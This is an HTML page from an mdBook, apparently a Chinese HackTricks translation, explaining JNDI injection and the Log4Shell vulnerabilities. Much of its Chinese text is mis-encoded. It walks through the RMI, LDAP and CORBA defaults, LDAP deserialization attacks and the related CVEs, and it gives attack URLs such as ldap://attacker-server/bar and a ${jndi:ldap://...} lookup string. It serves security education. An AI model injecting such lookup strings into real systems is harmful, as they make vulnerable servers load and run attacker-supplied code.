<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>JNDI - Java Naming and Directory Interface &amp; Log4Shell</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="jndi---java-naming-and-directory-interface--log4shell"><a class="header" href="#jndi---java-naming-and-directory-interface--log4shell">JNDI - Java Naming and Directory Interface &amp; Log4Shell</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯">åŸºæœ¬ä¿¡æ¯</a></h2>
<p>JNDI è‡ª 1990 å¹´ä»£æœ«é›†æˆåˆ° Java ä¸­ï¼Œä½œä¸ºç›®å½•æœåŠ¡ï¼Œä½¿ Java ç¨‹åºèƒ½å¤Ÿé€šè¿‡å‘½åç³»ç»Ÿå®šä½æ•°æ®æˆ–å¯¹è±¡ã€‚å®ƒé€šè¿‡æœåŠ¡æä¾›è€…æ¥å£ (SPIs) æ”¯æŒå„ç§ç›®å½•æœåŠ¡ï¼Œå…è®¸ä»ä¸åŒç³»ç»Ÿæ£€ç´¢æ•°æ®ï¼ŒåŒ…æ‹¬è¿œç¨‹ Java å¯¹è±¡ã€‚å¸¸è§çš„ SPI åŒ…æ‹¬ CORBA COSã€Java RMI æ³¨å†Œè¡¨å’Œ LDAPã€‚</p>
<h3 id="jndi-å‘½åå‚è€ƒ"><a class="header" href="#jndi-å‘½åå‚è€ƒ">JNDI å‘½åå‚è€ƒ</a></h3>
<p>Java å¯¹è±¡å¯ä»¥ä½¿ç”¨ JNDI å‘½åå¼•ç”¨è¿›è¡Œå­˜å‚¨å’Œæ£€ç´¢ï¼Œå½¢å¼æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li><strong>å¼•ç”¨åœ°å€</strong>ï¼šæŒ‡å®šå¯¹è±¡çš„ä½ç½®ï¼ˆä¾‹å¦‚ï¼Œ<em>rmi://server/ref</em>ï¼‰ï¼Œå…è®¸ç›´æ¥ä»æŒ‡å®šåœ°å€æ£€ç´¢ã€‚</li>
<li><strong>è¿œç¨‹å·¥å‚</strong>ï¼šå¼•ç”¨è¿œç¨‹å·¥å‚ç±»ã€‚è®¿é—®æ—¶ï¼Œè¯¥ç±»ä»è¿œç¨‹ä½ç½®ä¸‹è½½å¹¶å®ä¾‹åŒ–ã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œè¿™ç§æœºåˆ¶å¯èƒ½è¢«åˆ©ç”¨ï¼Œå¯èƒ½å¯¼è‡´åŠ è½½å’Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ä½œä¸ºå¯¹ç­–ï¼š</p>
<ul>
<li><strong>RMI</strong>ï¼š<code>java.rmi.server.useCodeabseOnly = true</code> ä» JDK 7u21 å¼€å§‹é»˜è®¤å¯ç”¨ï¼Œé™åˆ¶è¿œç¨‹å¯¹è±¡åŠ è½½ã€‚å®‰å…¨ç®¡ç†å™¨è¿›ä¸€æ­¥é™åˆ¶å¯ä»¥åŠ è½½çš„å†…å®¹ã€‚</li>
<li><strong>LDAP</strong>ï¼š<code>com.sun.jndi.ldap.object.trustURLCodebase = false</code> ä» JDK 6u141ã€7u131ã€8u121 å¼€å§‹é»˜è®¤å¯ç”¨ï¼Œé˜»æ­¢æ‰§è¡Œè¿œç¨‹åŠ è½½çš„ Java å¯¹è±¡ã€‚å¦‚æœè®¾ç½®ä¸º <code>true</code>ï¼Œåˆ™å¯ä»¥åœ¨æ²¡æœ‰å®‰å…¨ç®¡ç†å™¨ç›‘ç£çš„æƒ…å†µä¸‹æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚</li>
<li><strong>CORBA</strong>ï¼šæ²¡æœ‰ç‰¹å®šå±æ€§ï¼Œä½†å®‰å…¨ç®¡ç†å™¨å§‹ç»ˆå¤„äºæ´»åŠ¨çŠ¶æ€ã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œè´Ÿè´£è§£æ JNDI é“¾æ¥çš„ <strong>å‘½åç®¡ç†å™¨</strong> ç¼ºä¹å†…ç½®å®‰å…¨æœºåˆ¶ï¼Œå¯èƒ½å…è®¸ä»ä»»ä½•æ¥æºæ£€ç´¢å¯¹è±¡ã€‚è¿™æ„æˆé£é™©ï¼Œå› ä¸º RMIã€LDAP å’Œ CORBA çš„ä¿æŠ¤æªæ–½å¯èƒ½è¢«ç»•è¿‡ï¼Œå¯¼è‡´åŠ è½½ä»»æ„ Java å¯¹è±¡æˆ–åˆ©ç”¨ç°æœ‰åº”ç”¨ç¨‹åºç»„ä»¶ï¼ˆå°å·¥å…·ï¼‰è¿è¡Œæ¶æ„ä»£ç ã€‚</p>
<p>å¯åˆ©ç”¨çš„ URL ç¤ºä¾‹åŒ…æ‹¬ï¼š</p>
<ul>
<li><em>rmi://attacker-server/bar</em></li>
<li><em>ldap://attacker-server/bar</em></li>
<li><em>iiop://attacker-server/bar</em></li>
</ul>
<p>å°½ç®¡æœ‰ä¿æŠ¤æªæ–½ï¼Œæ¼æ´ä»ç„¶å­˜åœ¨ï¼Œä¸»è¦æ˜¯ç”±äºç¼ºä¹å¯¹ä»ä¸å—ä¿¡ä»»æ¥æºåŠ è½½ JNDI çš„ä¿æŠ¤ä»¥åŠç»•è¿‡ç°æœ‰ä¿æŠ¤çš„å¯èƒ½æ€§ã€‚</p>
<h3 id="jndi-ç¤ºä¾‹"><a class="header" href="#jndi-ç¤ºä¾‹">JNDI ç¤ºä¾‹</a></h3>
<p><img src="../../.gitbook/assets/image%20(1022).png" alt="" /></p>
<p>å³ä½¿æ‚¨å·²è®¾ç½® <strong><code>PROVIDER_URL</code></strong>ï¼Œæ‚¨ä»å¯ä»¥åœ¨æŸ¥æ‰¾ä¸­æŒ‡ç¤ºä¸åŒçš„ URLï¼Œå¹¶å°†å…¶è®¿é—®ï¼š<code>ctx.lookup("&lt;attacker-controlled-url&gt;")</code>ï¼Œè¿™å°±æ˜¯æ”»å‡»è€…å°†åˆ©ç”¨çš„å†…å®¹ï¼Œä»ä»–æ§åˆ¶çš„ç³»ç»ŸåŠ è½½ä»»æ„å¯¹è±¡ã€‚</p>
<h3 id="corba-æ¦‚è¿°"><a class="header" href="#corba-æ¦‚è¿°">CORBA æ¦‚è¿°</a></h3>
<p>CORBAï¼ˆé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„ï¼‰ä½¿ç”¨ <strong>å¯äº’æ“ä½œå¯¹è±¡å¼•ç”¨ (IOR)</strong> å”¯ä¸€æ ‡è¯†è¿œç¨‹å¯¹è±¡ã€‚æ­¤å¼•ç”¨åŒ…æ‹¬å…³é”®ä¿¡æ¯ï¼Œå¦‚ï¼š</p>
<ul>
<li><strong>ç±»å‹ ID</strong>ï¼šæ¥å£çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚</li>
<li><strong>ä»£ç åº“</strong>ï¼šè·å–å­˜æ ¹ç±»çš„ URLã€‚</li>
</ul>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒCORBA æœ¬èº«å¹¶ä¸è„†å¼±ã€‚ç¡®ä¿å®‰å…¨é€šå¸¸æ¶‰åŠï¼š</p>
<ul>
<li>å®‰è£… <strong>å®‰å…¨ç®¡ç†å™¨</strong>ã€‚</li>
<li>é…ç½®å®‰å…¨ç®¡ç†å™¨ä»¥å…è®¸è¿æ¥åˆ°æ½œåœ¨æ¶æ„çš„ä»£ç åº“ã€‚è¿™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š</li>
<li>å¥—æ¥å­—æƒé™ï¼Œä¾‹å¦‚ï¼Œ<code>permissions java.net.SocketPermission "*:1098-1099", "connect";</code>ã€‚</li>
<li>æ–‡ä»¶è¯»å–æƒé™ï¼Œå¯ä»¥æ˜¯é€šç”¨çš„ï¼ˆ<code>permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";</code>ï¼‰æˆ–é’ˆå¯¹å¯èƒ½æ”¾ç½®æ¶æ„æ–‡ä»¶çš„ç‰¹å®šç›®å½•ã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œä¸€äº›ä¾›åº”å•†æ”¿ç­–å¯èƒ½ä¼šå®½æ¾ï¼Œé»˜è®¤å…è®¸è¿™äº›è¿æ¥ã€‚</p>
<h3 id="rmi-ä¸Šä¸‹æ–‡"><a class="header" href="#rmi-ä¸Šä¸‹æ–‡">RMI ä¸Šä¸‹æ–‡</a></h3>
<p>å¯¹äº RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰ï¼Œæƒ…å†µæœ‰äº›ä¸åŒã€‚ä¸ CORBA ä¸€æ ·ï¼Œé»˜è®¤æƒ…å†µä¸‹é™åˆ¶ä»»æ„ç±»ä¸‹è½½ã€‚è¦åˆ©ç”¨ RMIï¼Œé€šå¸¸éœ€è¦ç»•è¿‡å®‰å…¨ç®¡ç†å™¨ï¼Œè¿™åœ¨ CORBA ä¸­ä¹ŸåŒæ ·é€‚ç”¨ã€‚</p>
<h3 id="ldap"><a class="header" href="#ldap">LDAP</a></h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åŒºåˆ†æœç´¢å’ŒæŸ¥æ‰¾ã€‚<br />
<strong>æœç´¢</strong>å°†ä½¿ç”¨ç±»ä¼¼ <code>ldap://localhost:389/o=JNDITutorial</code> çš„ URL ä» LDAP æœåŠ¡å™¨æŸ¥æ‰¾ JNDITutorial å¯¹è±¡å¹¶ <strong>æ£€ç´¢å…¶å±æ€§</strong>ã€‚<br />
<strong>æŸ¥æ‰¾</strong>æ—¨åœ¨ç”¨äº <strong>å‘½åæœåŠ¡</strong>ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è·å– <strong>ç»‘å®šåˆ°åç§°çš„ä»»ä½•å†…å®¹</strong>ã€‚</p>
<p>å¦‚æœ LDAP æœç´¢æ˜¯é€šè¿‡ <strong>SearchControls.setReturningObjFlag() è®¾ç½®ä¸º <code>true</code> è°ƒç”¨çš„ï¼Œåˆ™è¿”å›çš„å¯¹è±¡å°†è¢«é‡å»º</strong>ã€‚</p>
<p>å› æ­¤ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ”»å‡»è¿™äº›é€‰é¡¹ã€‚<br />
<strong>æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡åœ¨ LDAP è®°å½•ä¸­å¼•å…¥æœ‰æ•ˆè´Ÿè½½æ¥æ±¡æŸ“å®ƒä»¬</strong>ï¼Œè¿™äº›æœ‰æ•ˆè´Ÿè½½å°†åœ¨æ”¶é›†å®ƒä»¬çš„ç³»ç»Ÿä¸­æ‰§è¡Œï¼ˆå¦‚æœæ‚¨å¯ä»¥è®¿é—® LDAP æœåŠ¡å™¨ï¼Œè¿™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥ <strong>å¦¥åæ•°åå°æœºå™¨</strong>ï¼‰ã€‚å¦ä¸€ç§åˆ©ç”¨æ­¤æ¼æ´çš„æ–¹æ³•æ˜¯æ‰§è¡Œ <strong>MitM æ”»å‡»</strong>ï¼Œä¾‹å¦‚åœ¨ LDAP æœç´¢ä¸­ã€‚</p>
<p>å¦‚æœæ‚¨å¯ä»¥ <strong>ä½¿åº”ç”¨ç¨‹åºè§£æ JNDI LDAP URL</strong>ï¼Œæ‚¨å¯ä»¥æ§åˆ¶å°†è¦æœç´¢çš„ LDAPï¼Œå¹¶å¯ä»¥å‘é€å›æœ‰æ•ˆè´Ÿè½½ï¼ˆlog4shellï¼‰ã€‚</p>
<h4 id="ååºåˆ—åŒ–æ¼æ´"><a class="header" href="#ååºåˆ—åŒ–æ¼æ´">ååºåˆ—åŒ–æ¼æ´</a></h4>
<p><img src="../../.gitbook/assets/image%20(275).png" alt="" /></p>
<p><strong>æ¼æ´æ˜¯åºåˆ—åŒ–çš„</strong>ï¼Œå¹¶å°†è¢«ååºåˆ—åŒ–ã€‚<br />
å¦‚æœ <code>trustURLCodebase</code> ä¸º <code>true</code>ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä»£ç åº“ä¸­æä¾›è‡ªå·±çš„ç±»ï¼›å¦‚æœä¸æ˜¯ï¼Œä»–å°†éœ€è¦åˆ©ç”¨ç±»è·¯å¾„ä¸­çš„å°å·¥å…·ã€‚</p>
<h4 id="jndi-å¼•ç”¨æ¼æ´"><a class="header" href="#jndi-å¼•ç”¨æ¼æ´">JNDI å¼•ç”¨æ¼æ´</a></h4>
<p>ä½¿ç”¨ <strong>JavaFactory å¼•ç”¨</strong> æ”»å‡»æ­¤ LDAP æ›´å®¹æ˜“ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1059).png" alt="" /></p>
<h2 id="log4shell-æ¼æ´"><a class="header" href="#log4shell-æ¼æ´">Log4Shell æ¼æ´</a></h2>
<p>è¯¥æ¼æ´åœ¨ Log4j ä¸­å¼•å…¥ï¼Œå› ä¸ºå®ƒæ”¯æŒä¸€ç§ <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution"><strong>ç‰¹æ®Šè¯­æ³•</strong></a>ï¼Œå½¢å¼ä¸º <code>${prefix:name}</code>ï¼Œå…¶ä¸­ <code>prefix</code> æ˜¯å¤šä¸ªä¸åŒçš„ <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html"><strong>æŸ¥æ‰¾</strong></a> ä¹‹ä¸€ï¼Œ<code>name</code> åº”è¯¥è¢«è¯„ä¼°ã€‚ä¾‹å¦‚ï¼Œ<code>${java:version}</code> æ˜¯å½“å‰è¿è¡Œçš„ Java ç‰ˆæœ¬ã€‚</p>
<p><a href="https://issues.apache.org/jira/browse/LOG4J2-313"><strong>LOG4J2-313</strong></a> å¼•å…¥äº† <code>jndi</code> æŸ¥æ‰¾åŠŸèƒ½ã€‚æ­¤åŠŸèƒ½é€šè¿‡ JNDI å¯ç”¨å˜é‡çš„æ£€ç´¢ã€‚é€šå¸¸ï¼Œé”®ä¼šè‡ªåŠ¨ä»¥ <code>java:comp/env/</code> ä¸ºå‰ç¼€ã€‚ç„¶è€Œï¼Œå¦‚æœé”®æœ¬èº«åŒ…å« <strong>":"</strong>ï¼Œåˆ™ä¸ä¼šåº”ç”¨æ­¤é»˜è®¤å‰ç¼€ã€‚</p>
<p>åœ¨é”®ä¸­å­˜åœ¨ <strong>:</strong> çš„æƒ…å†µä¸‹ï¼Œä¾‹å¦‚ <code>${jndi:ldap://example.com/a}</code>ï¼Œ<strong>æ²¡æœ‰å‰ç¼€</strong>ï¼Œå¹¶ä¸” <strong>LDAP æœåŠ¡å™¨ä¼šæŸ¥è¯¢è¯¥å¯¹è±¡</strong>ã€‚è¿™äº›æŸ¥æ‰¾å¯ä»¥åœ¨ Log4j çš„é…ç½®ä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥åœ¨è®°å½•çš„è¡Œä¸­ä½¿ç”¨ã€‚</p>
<p>å› æ­¤ï¼Œè·å– RCE æ‰€éœ€çš„å”¯ä¸€æ¡ä»¶æ˜¯ <strong>å¤„ç†ç”¨æˆ·æ§åˆ¶çš„ä¿¡æ¯çš„ Log4j æ¼æ´ç‰ˆæœ¬</strong>ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªè¢« Java åº”ç”¨ç¨‹åºå¹¿æ³›ä½¿ç”¨çš„åº“æ¥è®°å½•ä¿¡æ¯ï¼ˆåŒ…æ‹¬é¢å‘äº’è”ç½‘çš„åº”ç”¨ç¨‹åºï¼‰ï¼Œå› æ­¤é€šå¸¸ä¼šæœ‰ log4j è®°å½•ä¾‹å¦‚æ¥æ”¶åˆ°çš„ HTTP å¤´ä¿¡æ¯ï¼Œå¦‚ User-Agentã€‚ç„¶è€Œï¼Œlog4j <strong>ä¸ä»…ç”¨äºè®°å½• HTTP ä¿¡æ¯ï¼Œè¿˜ç”¨äºè®°å½•å¼€å‘äººå‘˜æŒ‡ç¤ºçš„ä»»ä½•è¾“å…¥å’Œæ•°æ®</strong>ã€‚</p>
<h2 id="log4shell-ç›¸å…³-cve-æ¦‚è¿°"><a class="header" href="#log4shell-ç›¸å…³-cve-æ¦‚è¿°">Log4Shell ç›¸å…³ CVE æ¦‚è¿°</a></h2>
<h3 id="cve-2021-44228-ä¸¥é‡"><a class="header" href="#cve-2021-44228-ä¸¥é‡"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">CVE-2021-44228</a> <strong>[ä¸¥é‡]</strong></a></h3>
<p>æ­¤æ¼æ´æ˜¯ <code>log4j-core</code> ç»„ä»¶ä¸­çš„ä¸€ä¸ªå…³é”® <strong>ä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–ç¼ºé™·</strong>ï¼Œå½±å“ç‰ˆæœ¬ä» 2.0-beta9 åˆ° 2.14.1ã€‚å®ƒå…è®¸ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)</strong>ï¼Œä½¿æ”»å‡»è€…èƒ½å¤Ÿæ¥ç®¡ç³»ç»Ÿã€‚è¯¥é—®é¢˜ç”±é˜¿é‡Œäº‘å®‰å…¨å›¢é˜Ÿçš„é™ˆå…†å†›æŠ¥å‘Šï¼Œå½±å“å¤šä¸ª Apache æ¡†æ¶ã€‚ç‰ˆæœ¬ 2.15.0 ä¸­çš„åˆå§‹ä¿®å¤ä¸å®Œæ•´ã€‚é˜²å¾¡çš„ Sigma è§„åˆ™å¯ç”¨ï¼ˆ<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml">è§„åˆ™ 1</a>ï¼Œ<a href="https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml">è§„åˆ™ 2</a>ï¼‰ã€‚</p>
<h3 id="cve-2021-45046-ä¸¥é‡"><a class="header" href="#cve-2021-45046-ä¸¥é‡"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45046">CVE-2021-45046</a> <strong>[ä¸¥é‡]</strong></a></h3>
<p>æœ€åˆè¯„çº§ä¸ºä½ï¼Œä½†åæ¥å‡çº§ä¸ºä¸¥é‡ï¼Œæ­¤ CVE æ˜¯ç”±äº 2.15.0 å¯¹ CVE-2021-44228 çš„ä¿®å¤ä¸å®Œæ•´è€Œå¯¼è‡´çš„ <strong>æ‹’ç»æœåŠ¡ (DoS)</strong> ç¼ºé™·ã€‚å®ƒå½±å“éé»˜è®¤é…ç½®ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒåˆ¶ä½œçš„æœ‰æ•ˆè´Ÿè½½é€ æˆ DoS æ”»å‡»ã€‚ä¸€ä¸ª <a href="https://twitter.com/marcioalm/status/1471740771581652995">æ¨æ–‡</a> å±•ç¤ºäº†ä¸€ç§ç»•è¿‡æ–¹æ³•ã€‚è¯¥é—®é¢˜åœ¨ç‰ˆæœ¬ 2.16.0 å’Œ 2.12.2 ä¸­é€šè¿‡ç§»é™¤æ¶ˆæ¯æŸ¥æ‰¾æ¨¡å¼å’Œé»˜è®¤ç¦ç”¨ JNDI è§£å†³ã€‚</p>
<h3 id="cve-2021-4104-é«˜"><a class="header" href="#cve-2021-4104-é«˜"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4104">CVE-2021-4104</a> <strong>[é«˜]</strong></a></h3>
<p>å½±å“ <strong>Log4j 1.x ç‰ˆæœ¬</strong> åœ¨ä½¿ç”¨ <code>JMSAppender</code> çš„éé»˜è®¤é…ç½®ä¸­ï¼Œæ­¤ CVE æ˜¯ä¸€ä¸ªä¸å—ä¿¡ä»»çš„ååºåˆ—åŒ–ç¼ºé™·ã€‚1.x åˆ†æ”¯æ²¡æœ‰å¯ç”¨çš„ä¿®å¤ï¼Œå·²ç»“æŸç”Ÿå‘½å‘¨æœŸï¼Œå»ºè®®å‡çº§åˆ° <code>log4j-core 2.17.0</code>ã€‚</p>
<h3 id="cve-2021-42550-ä¸­ç­‰"><a class="header" href="#cve-2021-42550-ä¸­ç­‰"><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42550">CVE-2021-42550</a> <strong>[ä¸­ç­‰]</strong></a></h3>
<p>æ­¤æ¼æ´å½±å“ <strong>Logback æ—¥å¿—æ¡†æ¶</strong>ï¼Œè¿™æ˜¯ Log4j 1.x çš„ç»§ä»»è€…ã€‚ä¹‹å‰è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œè¯¥æ¡†æ¶è¢«å‘ç°å­˜åœ¨æ¼æ´ï¼Œå·²å‘å¸ƒæ–°ç‰ˆæœ¬ï¼ˆ1.3.0-alpha11 å’Œ 1.2.9ï¼‰ä»¥è§£å†³è¯¥é—®é¢˜ã€‚</p>
<h3 id="cve-2021-45105-é«˜"><a class="header" href="#cve-2021-45105-é«˜"><strong>CVE-2021-45105</strong> <strong>[é«˜]</strong></a></h3>
<p>Log4j 2.16.0 åŒ…å«ä¸€ä¸ª DoS ç¼ºé™·ï¼Œä¿ƒä½¿å‘å¸ƒ <code>log4j 2.17.0</code> æ¥ä¿®å¤è¯¥ CVEã€‚æ›´å¤šç»†èŠ‚è§ BleepingComputer çš„ <a href="https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/">æŠ¥å‘Š</a>ã€‚</p>
<h3 id="cve-2021-44832"><a class="header" href="#cve-2021-44832"><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">CVE-2021-44832</a></a></h3>
<p>å½±å“ log4j ç‰ˆæœ¬ 2.17ï¼Œæ­¤ CVE è¦æ±‚æ”»å‡»è€…æ§åˆ¶ log4j çš„é…ç½®æ–‡ä»¶ã€‚å®ƒæ¶‰åŠé€šè¿‡é…ç½®çš„ JDBCAppender è¿›è¡Œæ½œåœ¨çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚æ›´å¤šç»†èŠ‚å¯åœ¨ <a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">Checkmarx åšå®¢æ–‡ç« </a> ä¸­æ‰¾åˆ°ã€‚</p>
<h2 id="log4shell-åˆ©ç”¨"><a class="header" href="#log4shell-åˆ©ç”¨">Log4Shell åˆ©ç”¨</a></h2>
<h3 id="å‘ç°"><a class="header" href="#å‘ç°">å‘ç°</a></h3>
<p>å¦‚æœæ²¡æœ‰ä¿æŠ¤ï¼Œæ­¤æ¼æ´éå¸¸å®¹æ˜“å‘ç°ï¼Œå› ä¸ºå®ƒå°†å‘æ‚¨åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­æŒ‡ç¤ºçš„åœ°å€å‘é€è‡³å°‘ä¸€ä¸ª <strong>DNS è¯·æ±‚</strong>ã€‚å› æ­¤ï¼Œåƒè¿™æ ·çš„æœ‰æ•ˆè´Ÿè½½ï¼š</p>
<ul>
